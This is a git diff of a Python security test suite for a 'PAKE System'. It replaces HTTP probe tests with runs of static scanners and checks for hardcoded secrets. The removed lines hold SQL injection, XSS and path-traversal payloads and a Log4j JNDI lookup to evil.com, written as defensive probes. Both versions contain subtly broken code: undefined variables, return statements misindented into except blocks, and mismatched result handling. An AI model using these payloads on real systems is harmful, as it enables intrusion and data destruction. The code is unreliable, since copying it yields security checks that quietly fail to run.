@@ -1,338 +1,501 @@
 #!/usr/bin/env python3
 """
-PAKE System - Security Test Suite
-Comprehensive security testing for CI/CD pipeline
+PAKE System Security Test Suite
+Phoenix Protocol Phase 7.2 - Comprehensive Security Testing
+
+This script provides comprehensive security testing capabilities for the PAKE System,
+integrating with the security-first CI/CD pipeline.
 """
 
 import argparse
-import asyncio
+from datetime import datetime
 import json
+import logging
+import os
+from pathlib import Path
+import subprocess
 import sys
-import time
-from typing import Any
+from typing import Any, Dict, List, Optional
 
-import httpx
+# Configure logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s'
+)
+logger = logging.getLogger(__name__)
 
 
 class SecurityTestSuite:
-    """Comprehensive security test suite for PAKE System"""
+    """Comprehensive security testing suite for PAKE System."""
 
-    def __init__(self) -> None:
-        self.base_url = base_url.rstrip("/")
+    def __init__(self, config_path: Optional[str] = None):
+        """Initialize the security test suite."""
+        self.config_path = config_path or "security-gate-config.yaml"
         self.results = {
-            "timestamp": time.time(),
-            "base_url": base_url,
-            "tests": [],
-            "summary": {"total": 0, "passed": 0, "failed": 0, "critical_failures": 0},
+            "timestamp": datetime.now().isoformat(),
+            "tests": {},
+            "summary": {
+                "total_tests": 0,
+                "passed": 0,
+                "failed": 0,
+                "warnings": 0
+            }
         }
-
-    async def run_test(self, test_name: str, test_func) -> Dict[str, Any]:
-        """Run a single security test"""
-        print(f"🔒 Running security test: {test_name}")
-
+        
+    def load_config(self) -> Dict[str, Any]:
+        """Load security configuration."""
         try:
-            result = await test_func()
-            self.results["tests"].append(
-                {
-                    "name": test_name,
-                    "status": "passed" if result["passed"] else "failed",
-                    "details": result.get("details", ""),
-                    "critical": result.get("critical", False),
-                }
+            import yaml
+            with open(self.config_path, 'r') as f:
+                return yaml.safe_load(f)
+        except FileNotFoundError:
+            logger.warning(f"Configuration file {self.config_path} not found, using defaults")
+            return self._get_default_config()
+        except (FileNotFoundError, PermissionError, OSError) as e:
+            logger.error(f"Error loading configuration: {e}")
+            return self._get_default_config()
+    
+    def _get_default_config(self) -> Dict[str, Any]:
+        """Get default security configuration."""
+        return {
+            "SECURITY_GATE_CONFIG": {
+                "CRITICAL_VULNERABILITIES_MAX": 0,
+                "HIGH_VULNERABILITIES_MAX": 0,
+                "MEDIUM_VULNERABILITIES_MAX": 10,
+                "LOW_VULNERABILITIES_MAX": 50
+            },
+            "DEPENDENCY_SCANNING": {
+                "TRIVY_ENABLED": True,
+                "PIP_AUDIT_ENABLED": True,
+                "SAFETY_ENABLED": True
+            },
+            "SECRET_SCANNING": {
+                "TRUFFLEHOG_ENABLED": True,
+                "GITLEAKS_ENABLED": True,
+                "VERIFY_SECRETS": True
+            },
+            "SAST_SCANNING": {
+                "SEMGREP_ENABLED": True,
+                "BANDIT_ENABLED": True,
+                "RUFF_SECURITY_ENABLED": True
+            }
+        }
+    
+    def run_command(self, command: List[str], description: str) -> Dict[str, Any]:
+        """Run a command and return results."""
+        logger.info(f"Running: {description}")
+        try:
+            result = subprocess.run(
+                command,
+                capture_output=True,
+                text=True,
+                timeout=300  # 5 minute timeout
             )
 
-            if result["passed"]:
-                self.results["summary"]["passed"] += 1
-                print(f"✅ {test_name}: PASSED")
-            else:
-                self.results["summary"]["failed"] += 1
-                if result.get("critical", False):
-                    self.results["summary"]["critical_failures"] += 1
-                print(f"❌ {test_name}: FAILED - {result.get('details', '')}")
-
-        except Exception as e:
-            self.results["tests"].append(
-                {
-                    "name": test_name,
-                    "status": "error",
-                    "details": str(e),
-                    "critical": True,
-                }
+            return {
+                "command": " ".join(command),
+                "description": description,
+                "returncode": result.returncode,
+                "stdout": result.stdout,
+                "stderr": result.stderr,
+                "success": result.returncode == 0
+            }
+        except subprocess.TimeoutExpired:
+            logger.error(f"Command timed out: {description}")
+            return {
+                "command": " ".join(command),
+                "description": description,
+                "returncode": -1,
+                "stdout": "",
+                "stderr": "Command timed out",
+                "success": False
+            }
+        except (ValueError, RuntimeError) as e:
+            logger.error(f"Error running command {description}: {e}")
+            return {
+                "command": " ".join(command),
+                "description": description,
+                "returncode": -1,
+                "stdout": "",
+                "stderr": str(e),
+                "success": False
+            }
+    
+    def test_dependency_security(self) -> Dict[str, Any]:
+        """Test dependency security using multiple tools."""
+        logger.info("Testing dependency security...")
+        config = self.load_config()
+        results = {}
+        
+        # Run pip-audit
+        if config.get("DEPENDENCY_SCANNING", {}).get("PIP_AUDIT_ENABLED", True):
+            results["pip_audit"] = self.run_command(
+                ["pip-audit", "--format=json", "--desc"],
+                "pip-audit dependency vulnerability scan"
             )
-            self.results["summary"]["failed"] += 1
-            self.results["summary"]["critical_failures"] += 1
-            print(f"💥 {test_name}: ERROR - {str(e)}")
-
-        self.results["summary"]["total"] += 1
-        return {"status": "completed"}
-
-    async def test_authentication_bypass(self) -> Dict[str, Any]:
-        """Test for authentication bypass vulnerabilities"""
-        async with httpx.AsyncClient() as client:
-            # Test protected endpoints without authentication
-            protected_endpoints = [
-                "/auth/profile",
-                "/auth/users",
-                "/admin/dashboard",
-                "/api/v1/sensitive-data",
-            ]
-
-            bypass_attempts = 0
-            for endpoint in protected_endpoints:
-                try:
-                    response = await client.get(f"{self.base_url}{endpoint}")
-                    if response.status_code == 200:
-                        bypass_attempts += 1
-                except:
-                    pass
-
-            return {
-                "passed": bypass_attempts == 0,
-                "critical": True,
-                "details": f"Authentication bypass attempts: {bypass_attempts}/{len(protected_endpoints)}",
-            }
-
-    async def test_sql_injection(self) -> Dict[str, Any]:
-        """Test for SQL injection vulnerabilities"""
-        async with httpx.AsyncClient() as client:
-            sql_payloads = [
-                "' OR '1'='1",
-                "'; DROP TABLE users; --",
-                "' UNION SELECT * FROM users --",
-                "1' OR '1'='1' --",
-            ]
-
-            vulnerable_endpoints = 0
-            for payload in sql_payloads:
-                try:
-                    # Test common endpoints that might be vulnerable
-                    response = await client.get(
-                        f"{self.base_url}/api/search", params={"q": payload}
-                    )
-                    # Check for SQL error messages in response
-                    if any(
-                        error in response.text.lower()
-                        for error in [
-                            "sql",
-                            "database",
-                            "mysql",
-                            "postgresql",
-                            "syntax error",
-                        ]
-                    ):
-                        vulnerable_endpoints += 1
-                except:
-                    pass
-
-            return {
-                "passed": vulnerable_endpoints == 0,
-                "critical": True,
-                "details": f"SQL injection vulnerabilities found: {vulnerable_endpoints}",
-            }
-
-    async def test_xss_vulnerabilities(self) -> Dict[str, Any]:
-        """Test for Cross-Site Scripting vulnerabilities"""
-        async with httpx.AsyncClient() as client:
-            xss_payloads = [
-                "<script>alert('XSS')</script>",
-                "javascript:alert('XSS')",
-                "<img src=x onerror=alert('XSS')>",
-                "<svg onload=alert('XSS')>",
-            ]
-
-            vulnerable_endpoints = 0
-            for payload in xss_payloads:
-                try:
-                    response = await client.post(
-                        f"{self.base_url}/api/comment", json={"content": payload}
-                    )
-                    if payload in response.text:
-                        vulnerable_endpoints += 1
-                except:
-                    pass
-
-            return {
-                "passed": vulnerable_endpoints == 0,
-                "critical": True,
-                "details": f"XSS vulnerabilities found: {vulnerable_endpoints}",
-            }
-
-    async def test_csrf_protection(self) -> Dict[str, Any]:
-        """Test for CSRF protection"""
-        async with httpx.AsyncClient() as client:
-            # Test if CSRF tokens are required for state-changing operations
-            try:
-                response = await client.post(
-                    f"{self.base_url}/api/user/update",
-                    json={"email": "test@example.com"},
-                )
-                # If request succeeds without CSRF token, it's vulnerable
-                csrf_protected = response.status_code in [403, 400]
-
-                return {
-                    "passed": csrf_protected,
-                    "critical": False,
-                    "details": "CSRF protection"
-                    + ("enabled" if csrf_protected else "disabled"),
-                }
-            except:
-                return {
-                    "passed": False,
-                    "critical": False,
-                    "details": "Could not test CSRF protection",
-                }
-
-    async def test_rate_limiting(self) -> Dict[str, Any]:
-        """Test for rate limiting implementation"""
-        async with httpx.AsyncClient() as client:
-            # Send multiple requests rapidly
-            requests_sent = 0
-            rate_limited = False
-
-            for _i in range(100):  # Send 100 requests rapidly
-                try:
-                    response = await client.get(f"{self.base_url}/api/data")
-                    requests_sent += 1
-                    if response.status_code == 429:  # Too Many Requests
-                        rate_limited = True
-                        break
-                except:
-                    break
-
-            return {
-                "passed": rate_limited,
-                "critical": False,
-                "details": f"Rate limiting {'enabled' if rate_limited else 'disabled'} after {requests_sent} requests",
-            }
-
-    async def test_headers_security(self) -> Dict[str, Any]:
-        """Test for security headers"""
-        async with httpx.AsyncClient() as client:
-            try:
-                response = await client.get(f"{self.base_url}/")
-                headers = response.headers
-
-                security_headers = {
-                    "X-Content-Type-Options": "nosniff",
-                    "X-Frame-Options": "DENY",
-                    "X-XSS-Protection": "1; mode=block",
-                    "Strict-Transport-Security": "max-age=31536000",
-                    "Content-Security-Policy": "default-src 'self'",
-                }
-
-                missing_headers = []
-                for header, _expected_value in security_headers.items():
-                    if header not in headers:
-                        missing_headers.append(header)
-
-                return {
-                    "passed": len(missing_headers) == 0,
-                    "critical": False,
-                    "details": f"Missing security headers: {', '.join(missing_headers)}",
-                }
-            except:
-                return {
-                    "passed": False,
-                    "critical": False,
-                    "details": "Could not test security headers",
-                }
-
-    async def test_input_validation(self) -> Dict[str, Any]:
-        """Test for input validation vulnerabilities"""
-        async with httpx.AsyncClient() as client:
-            malicious_inputs = [
-                "../../etc/passwd",  # Path traversal
-                "null\x00byte",  # Null byte injection
-                "A" * 10000,  # Buffer overflow attempt
-                "<script>",  # Script injection
-                "${jndi:ldap://evil.com/a}",  # Log4j vulnerability
-            ]
-
-            vulnerable_inputs = 0
-            for malicious_input in malicious_inputs:
-                try:
-                    response = await client.post(
-                        f"{self.base_url}/api/upload",
-                        json={"filename": malicious_input},
-                    )
-                    # Check if malicious input is reflected in response
-                    if malicious_input in response.text:
-                        vulnerable_inputs += 1
-                except:
-                    pass
-
-            return {
-                "passed": vulnerable_inputs == 0,
-                "critical": True,
-                "details": f"Input validation vulnerabilities: {vulnerable_inputs}",
-            }
-
-    async def run_all_tests(self) -> None:
-        """Run all security tests"""
-        print("🛡️ Starting PAKE System Security Test Suite")
-        print(f"Target URL: {self.base_url}")
-        print("=" * 50)
-
-        tests = [
-            ("Authentication Bypass", self.test_authentication_bypass),
-            ("SQL Injection", self.test_sql_injection),
-            ("XSS Vulnerabilities", self.test_xss_vulnerabilities),
-            ("CSRF Protection", self.test_csrf_protection),
-            ("Rate Limiting", self.test_rate_limiting),
-            ("Security Headers", self.test_headers_security),
-            ("Input Validation", self.test_input_validation),
+        
+        # Run safety check
+        if config.get("DEPENDENCY_SCANNING", {}).get("SAFETY_ENABLED", True):
+            results["safety"] = self.run_command(
+                ["safety", "check", "--json"],
+                "safety dependency vulnerability check"
+            )
+        
+        # Run poetry audit if available
+        try:
+            results["poetry_audit"] = self.run_command(
+                ["poetry", "audit"],
+                "poetry dependency audit"
+            )
+        except FileNotFoundError:
+            logger.info("Poetry not available, skipping poetry audit")
+        
+        return results
+    
+    def test_secret_detection(self) -> Dict[str, Any]:
+        """Test secret detection capabilities."""
+        logger.info("Testing secret detection...")
+        config = self.load_config()
+        results = {}
+        
+        # Check for hardcoded secrets in source code
+        results["hardcoded_secrets"] = self._check_hardcoded_secrets()
+        
+        # Validate environment variable usage
+        results["env_var_validation"] = self._validate_environment_variables()
+        
+        return results
+    
+    def _check_hardcoded_secrets(self) -> Dict[str, Any]:
+        """Check for hardcoded secrets in source code."""
+        logger.info("Checking for hardcoded secrets...")
+        
+        patterns = [
+            r'password\s*=\s*["\'][^"\']+["\']',
+            r'api_key\s*=\s*["\'][^"\']+["\']',
+            r'secret\s*=\s*["\'][^"\']+["\']',
+            r'token\s*=\s*["\'][^"\']+["\']',
+            r'REDACTED_SECRET',  # Should not exist
         ]
+        
+        issues = []
+        src_path = Path("src")
+        
+        if not src_path.exists():
+            return {
+                "success": True,
+                "issues": [],
+                "message": "src/ directory not found"
+            }
+        
+        for py_file in src_path.rglob("*.py"):
+            try:
+                with open(py_file, 'r', encoding='utf-8') as f:
+                    content = f.read()
+                    for i, line in enumerate(content.split('\n'), 1):
+                        for pattern in patterns:
+                            import re
+                            if re.search(pattern, line, re.IGNORECASE):
+                                issues.append({
+                                    "file": str(py_file),
+                                    "line": i,
+                                    "pattern": pattern,
+                                    "content": line.strip()
+                                })
+            except (FileNotFoundError, PermissionError, OSError) as e:
+                logger.warning(f"Could not check {py_file}: {e}")
 
-        for test_name, test_func in tests:
-            await self.run_test(test_name, test_func)
+                return {
+            "success": len(issues) == 0,
+            "issues": issues,
+            "count": len(issues)
+        }
+    
+    def _validate_environment_variables(self) -> Dict[str, Any]:
+        """Validate proper environment variable usage."""
+        logger.info("Validating environment variable usage...")
+        
+        # Check that critical secrets use environment variables
+        critical_env_vars = [
+            "PAKE_MASTER_KEY",
+            "DATABASE_URL",
+            "REDIS_URL",
+            "JWT_SECRET",
+            "API_KEY"
+        ]
+        
+        results = {}
+        for var in critical_env_vars:
+            value = os.getenv(var)
+            results[var] = {
+                "set": value is not None,
+                "length": len(value) if value else 0,
+                "secure": len(value) >= 32 if value else False
+            }
+        
+        return {
+            "success": all(result["set"] and result["secure"] for result in results.values()),
+            "variables": results
+        }
+    
+    def test_static_analysis(self) -> Dict[str, Any]:
+        """Test static analysis security tools."""
+        logger.info("Testing static analysis security...")
+        config = self.load_config()
+        results = {}
+        
+        # Run Bandit
+        if config.get("SAST_SCANNING", {}).get("BANDIT_ENABLED", True):
+            results["bandit"] = self.run_command(
+                ["bandit", "-r", "src/", "-f", "json"],
+                "Bandit security linter"
+            )
+        
+        # Run Ruff security rules
+        if config.get("SAST_SCANNING", {}).get("RUFF_SECURITY_ENABLED", True):
+            results["ruff_security"] = self.run_command(
+                ["ruff", "check", "src/", "--select", "S", "--output-format=json"],
+                "Ruff security rules"
+            )
+        
+        return results
+    
+    def test_authentication_security(self) -> Dict[str, Any]:
+        """Test authentication and authorization security."""
+        logger.info("Testing authentication security...")
+        
+        # Check for secure password hashing
+        results = self._check_password_security()
+        
+        # Check JWT configuration
+        results["jwt_security"] = self._check_jwt_security()
+        
+        return results
+    
+    def _check_password_security(self) -> Dict[str, Any]:
+        """Check password security implementation."""
+        logger.info("Checking password security...")
+        
+        # Look for password hashing implementations
+        src_path = Path("src")
+        password_issues = []
+        
+        if src_path.exists():
+            for py_file in src_path.rglob("*.py"):
+                try:
+                    with open(py_file, 'r', encoding='utf-8') as f:
+                        content = f.read()
+                        
+                        # Check for insecure password handling
+                        if "password" in content.lower():
+                            if "bcrypt" not in content and "argon2" not in content and "scrypt" not in content:
+                                if "hashlib.md5" in content or "hashlib.sha1" in content:
+                                    password_issues.append({
+                                        "file": str(py_file),
+                                        "issue": "Insecure password hashing detected",
+                                        "severity": "HIGH"
+                                    })
+                except (FileNotFoundError, PermissionError, OSError) as e:
+                    logger.warning(f"Could not check {py_file}: {e}")
 
-        # Generate summary
-        print("\n" + "=" * 50)
-        print("🛡️ Security Test Suite Summary")
-        print(f"Total Tests: {self.results['summary']['total']}")
-        print(f"Passed: {self.results['summary']['passed']}")
-        print(f"Failed: {self.results['summary']['failed']}")
-        print(f"Critical Failures: {self.results['summary']['critical_failures']}")
+            return {
+            "success": len(password_issues) == 0,
+            "issues": password_issues,
+            "count": len(password_issues)
+        }
+    
+    def _check_jwt_security(self) -> Dict[str, Any]:
+        """Check JWT security implementation."""
+        logger.info("Checking JWT security...")
+        
+        # Check JWT secret strength
+        jwt_secret = os.getenv("JWT_SECRET")
+        
+        return {
+            "success": jwt_secret is not None and len(jwt_secret) >= 32,
+            "secret_length": len(jwt_secret) if jwt_secret else 0,
+            "secret_set": jwt_secret is not None
+        }
+    
+    def test_data_protection(self) -> Dict[str, Any]:
+        """Test data protection and privacy measures."""
+        logger.info("Testing data protection...")
+        
+        # Check for data encryption
+        results = self._check_data_encryption()
+        
+        # Check for sensitive data handling
+        results["sensitive_data"] = self._check_sensitive_data_handling()
+        
+        return results
+    
+    def _check_data_encryption(self) -> Dict[str, Any]:
+        """Check data encryption implementation."""
+        logger.info("Checking data encryption...")
+        
+        encryption_issues = []
+        src_path = Path("src")
+        
+        if src_path.exists():
+            for py_file in src_path.rglob("*.py"):
+                try:
+                    with open(py_file, 'r', encoding='utf-8') as f:
+                        content = f.read()
+                        
+                        # Check for encryption usage
+                        if "encrypt" in content.lower() or "decrypt" in content.lower():
+                            if "cryptography" not in content and "pycryptodome" not in content:
+                                encryption_issues.append({
+                                    "file": str(py_file),
+                                    "issue": "Potential insecure encryption implementation",
+                                    "severity": "MEDIUM"
+                                })
+                except (FileNotFoundError, PermissionError, OSError) as e:
+                    logger.warning(f"Could not check {py_file}: {e}")
 
-        if self.results["summary"]["critical_failures"] > 0:
-            print("❌ CRITICAL SECURITY ISSUES FOUND!")
-            return False
-        if self.results["summary"]["failed"] > 0:
-            print("⚠️ Some security issues found, but none critical")
-            return True
-        print("✅ All security tests passed!")
-        return True
+                return {
+            "success": len(encryption_issues) == 0,
+            "issues": encryption_issues,
+            "count": len(encryption_issues)
+        }
+    
+    def _check_sensitive_data_handling(self) -> Dict[str, Any]:
+        """Check sensitive data handling."""
+        logger.info("Checking sensitive data handling...")
+        
+        sensitive_patterns = [
+            "credit_card",
+            "ssn",
+            "social_security",
+            "personal_id",
+            "phone_number",
+            "email_address"
+        ]
+        
+        issues = []
+        src_path = Path("src")
+        
+        if src_path.exists():
+            for py_file in src_path.rglob("*.py"):
+                try:
+                    with open(py_file, 'r', encoding='utf-8') as f:
+                        content = f.read()
+                        for pattern in sensitive_patterns:
+                            if pattern in content.lower():
+                                issues.append({
+                                    "file": str(py_file),
+                                    "pattern": pattern,
+                                    "severity": "MEDIUM"
+                                })
+                except (FileNotFoundError, PermissionError, OSError) as e:
+                    logger.warning(f"Could not check {py_file}: {e}")
 
-    def save_report(self) -> None:
-        """Save test results to file"""
-        with open(filename, "w") as f:
+            return {
+            "success": len(issues) == 0,
+            "issues": issues,
+            "count": len(issues)
+        }
+    
+    def run_comprehensive_test(self) -> Dict[str, Any]:
+        """Run comprehensive security test suite."""
+        logger.info("Starting comprehensive security test suite...")
+        
+        # Run all test categories
+        test_categories = [
+            ("dependency_security", self.test_dependency_security),
+            ("secret_detection", self.test_secret_detection),
+            ("static_analysis", self.test_static_analysis),
+            ("authentication_security", self.test_authentication_security),
+            ("data_protection", self.test_data_protection),
+        ]
+        
+        for category_name, test_func in test_categories:
+            logger.info(f"Running {category_name} tests...")
+            try:
+                self.results["tests"][category_name] = test_func()
+                self.results["summary"]["total_tests"] += 1
+                
+                # Determine if test passed/failed
+                test_result = self.results["tests"][category_name]
+                if isinstance(test_result, dict):
+                    if test_result.get("success", False):
+                        self.results["summary"]["passed"] += 1
+                    else:
+                        self.results["summary"]["failed"] += 1
+                else:
+                    # Handle multiple results
+                    for subtest in test_result.values():
+                        if isinstance(subtest, dict) and subtest.get("success", False):
+                            self.results["summary"]["passed"] += 1
+                        else:
+                            self.results["summary"]["failed"] += 1
+                            
+            except (ValueError, RuntimeError) as e:
+                logger.error(f"Error running {category_name} tests: {e}")
+                self.results["tests"][category_name] = {
+                    "success": False,
+                    "error": str(e)
+                }
+                self.results["summary"]["failed"] += 1
+        
+        return self.results
+    
+    def generate_report(self, output_file: str = "security_test_report.json") -> None:
+        """Generate security test report."""
+        logger.info(f"Generating security test report: {output_file}")
+        
+        with open(output_file, 'w') as f:
             json.dump(self.results, f, indent=2)
-        print(f"📄 Security test report saved to {filename}")
+        
+        logger.info(f"Security test report saved to {output_file}")
+        
+        # Print summary
+        summary = self.results["summary"]
+        logger.info(f"Security Test Summary:")
+        logger.info(f"  Total Tests: {summary['total_tests']}")
+        logger.info(f"  Passed: {summary['passed']}")
+        logger.info(f"  Failed: {summary['failed']}")
+        logger.info(f"  Warnings: {summary['warnings']}")
 
 
-async def main(self) -> None:
-    """Main entry point"""
+def main():
+    """Main entry point for security test suite."""
     parser = argparse.ArgumentParser(description="PAKE System Security Test Suite")
     parser.add_argument(
-        "--base-url",
-        default="http://localhost:8000",
-        help="Base URL of the application to test",
+        "--config",
+        help="Path to security configuration file",
+        default="security-gate-config.yaml"
     )
     parser.add_argument(
         "--output",
-        default="security_test_report.json",
         help="Output file for test results",
+        default="security_test_report.json"
+    )
+    parser.add_argument(
+        "--base-url",
+        help="Base URL for testing (for production tests)",
+        default=None
     )
 
     args = parser.parse_args()
 
-    test_suite = SecurityTestSuite(args.base_url)
-    success = await test_suite.run_all_tests()
-    test_suite.save_report(args.output)
+    # Initialize security test suite
+    suite = SecurityTestSuite(config_path=args.config)
+    
+    # Run comprehensive tests
+    results = suite.run_comprehensive_test()
+    
+    # Generate report
+    suite.generate_report(output_file=args.output)
 
     # Exit with appropriate code
-    sys.exit(0 if success else 1)
+    if results["summary"]["failed"] > 0:
+        logger.error("Security tests failed!")
+        sys.exit(1)
+    else:
+        logger.info("All security tests passed!")
+        sys.exit(0)
 
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    main()
